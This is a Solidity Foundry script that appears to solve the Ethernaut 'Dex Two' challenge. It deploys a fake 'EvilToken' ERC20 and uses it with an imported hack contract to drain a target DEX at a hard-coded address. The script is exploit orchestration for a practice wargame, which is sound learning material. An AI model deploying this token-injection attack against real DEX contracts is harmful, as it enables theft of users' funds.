// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwoHack} from "ethernaut/dextwo_hack.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply, address _hack) ERC20("EvilToken", "EVL") {
        _mint(_hack, initialSupply);
    }
}

contract DexTwoHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address target = address(0x2842D933D1B0879A56d03745416B80bBAb8cF936);
        DexTwoHack dextwoHack = new DexTwoHack(target);
        // deploy EvilToken
        EvilToken evilIns = new EvilToken(uint256(100000), address(dextwoHack));
        address evilAddress = address(evilIns);
        dextwoHack.hack(evilAddress);
        vm.stopBroadcast();
    }
}
